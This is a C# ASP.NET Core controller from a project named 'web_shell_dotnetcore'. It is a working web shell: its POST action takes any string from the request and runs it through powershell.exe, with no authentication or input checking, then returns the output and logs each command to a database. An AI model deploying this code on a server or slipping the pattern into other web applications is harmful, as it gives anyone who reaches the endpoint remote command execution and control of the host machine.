﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.EntityFrameworkCore;
using web_shell_dotnetcore;
using web_shell_dotnetcore.Models;
using Newtonsoft.Json;

namespace web_shell_dotnetcore.Controllers
{
    public class PowerShellCMsController : Controller
    {
        private readonly AppContext _context;

        public PowerShellCMsController(AppContext context)
        {
            _context = context;
        }

        // GET: PowerShellCMs
        public IActionResult Index()
        {
            ViewBag.history = _context.PSCommands.ToList();
            return View();
        }
        [HttpPost]
        public JsonResult Cmd(string cmd)
        {
            string result, error;
            
            _context.PSCommands.Add(new PowerShellCM()
            {
                Command = cmd
            });
            _context.SaveChanges();
            var process = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-c \"{cmd}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            process.Start();
            result = process.StandardOutput.ReadToEnd();
            error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            result = result == "" ? error : result;
            
            return new JsonResult(result)
            {
                StatusCode = 200
            };            
        }
        [HttpGet]
        public JsonResult GetHistory()
        {
            return new JsonResult("");
        }
    }
}
